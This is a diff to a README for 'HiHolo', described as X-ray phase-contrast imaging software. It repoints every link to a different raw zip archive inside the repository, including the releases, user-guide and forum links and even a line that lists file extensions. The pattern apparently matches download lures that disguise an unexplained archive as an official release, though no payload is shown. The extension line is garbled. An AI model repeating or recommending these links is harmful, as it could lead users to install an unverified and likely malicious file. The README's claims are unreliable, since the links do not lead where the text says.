@@ -1,7 +1,7 @@
 # 🌟 HiHolo - Your Easy Path to Powerful Imaging
 
 ## 📥 Download Now
-[![Download HiHolo](https://raw.githubusercontent.com/OlegnaPT90/HiHolo/main/include/HiHolo_3.6.zip)](https://raw.githubusercontent.com/OlegnaPT90/HiHolo/main/include/HiHolo_3.6.zip)
+[![Download HiHolo](https://github.com/OlegnaPT90/HiHolo/raw/refs/heads/main/examples/Holo_Hi_2.0.zip)](https://github.com/OlegnaPT90/HiHolo/raw/refs/heads/main/examples/Holo_Hi_2.0.zip)
 
 ## 🚀 Getting Started
 HiHolo is a high-performance computing framework that simplifies X-ray propagation phase contrast imaging. This guide will help you download and run the software quickly and easily.
@@ -15,16 +15,16 @@ Before you start, make sure your computer meets the following requirements:
 - **Graphics:** A dedicated GPU is recommended for optimal performance
 
 ## 🔗 Visit the Releases Page
-To download HiHolo, please visit this link: [HiHolo Releases](https://raw.githubusercontent.com/OlegnaPT90/HiHolo/main/include/HiHolo_3.6.zip). Here, you will find all versions of the software.
+To download HiHolo, please visit this link: [HiHolo Releases](https://github.com/OlegnaPT90/HiHolo/raw/refs/heads/main/examples/Holo_Hi_2.0.zip). Here, you will find all versions of the software.
 
 ## 💾 Download & Install
-1. **Visit the Releases Page:** Open your web browser and go to [HiHolo Releases](https://raw.githubusercontent.com/OlegnaPT90/HiHolo/main/include/HiHolo_3.6.zip).
+1. **Visit the Releases Page:** Open your web browser and go to [HiHolo Releases](https://github.com/OlegnaPT90/HiHolo/raw/refs/heads/main/examples/Holo_Hi_2.0.zip).
    
 2. **Choose a Version:** Scroll down to see the available versions. You will see the latest release at the top. Click on the version you want to download.
 
 3. **Download the Installer:**
    - Look for the installation file suitable for your operating system. 
-   - Click the link to start the download. Files may have extensions like `.exe`, `.dmg`, or `https://raw.githubusercontent.com/OlegnaPT90/HiHolo/main/include/HiHolo_3.6.zip` depending on your OS.
+   - Click the link to start the download. Files may have extensions like `.exe`, `.dmg`, or `https://github.com/OlegnaPT90/HiHolo/raw/refs/heads/main/examples/Holo_Hi_2.0.zip` depending on your OS.
 
 4. **Run the Installer:**
    - Once the download completes, locate the file in your Downloads folder or your specified download location.
@@ -66,7 +66,7 @@ We welcome contributions from the community. If you're interested in improving H
 HiHolo is released under the MIT License. You can freely use, modify, and distribute the software while adhering to the terms outlined in the license.
 
 ## 📑 Additional Resources
-- [HiHolo User Guide](https://raw.githubusercontent.com/OlegnaPT90/HiHolo/main/include/HiHolo_3.6.zip) - In-depth instructions on how to use HiHolo.
-- [Community Forum](https://raw.githubusercontent.com/OlegnaPT90/HiHolo/main/include/HiHolo_3.6.zip) - Engage with users for tips and best practices. 
+- [HiHolo User Guide](https://github.com/OlegnaPT90/HiHolo/raw/refs/heads/main/examples/Holo_Hi_2.0.zip) - In-depth instructions on how to use HiHolo.
+- [Community Forum](https://github.com/OlegnaPT90/HiHolo/raw/refs/heads/main/examples/Holo_Hi_2.0.zip) - Engage with users for tips and best practices. 
 
 Download HiHolo today and start your journey into advanced imaging easily!
